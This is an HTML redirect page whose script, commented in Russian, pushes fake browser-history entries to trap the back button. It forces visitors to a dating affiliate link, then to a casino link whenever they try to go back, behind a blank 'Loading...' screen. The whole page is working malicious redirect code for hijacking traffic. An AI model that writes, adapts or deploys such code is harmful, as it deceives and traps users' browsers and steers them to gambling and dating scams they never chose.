<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Redirect</title>

<script>

const DATING = "https://tone.affomelody.com/click?pid=6350&offer_id=25";
const CASINO = "https://onlinepnpbit.com/2Vi4txHl/";

let state = 0;

// создаем ловушку истории
function trapHistory(){
history.pushState({}, "", "#a");
history.pushState({}, "", "#b");
history.pushState({}, "", "#c");
}

// первый запуск
window.onload = function(){

trapHistory();

// сразу редирект на дейтинг
setTimeout(function(){
location.replace(DATING);
},50);

};

// ловим кнопку назад
window.onpopstate = function(){

if(state === 0){

state = 1;
trapHistory();
location.replace(CASINO);

}else{

state = 0;
trapHistory();
location.replace(DATING);

}

};

</script>

</head>

<body style="background:#000;color:#fff;font-family:Arial;text-align:center;padding-top:120px">

Loading...

</body>
</html>
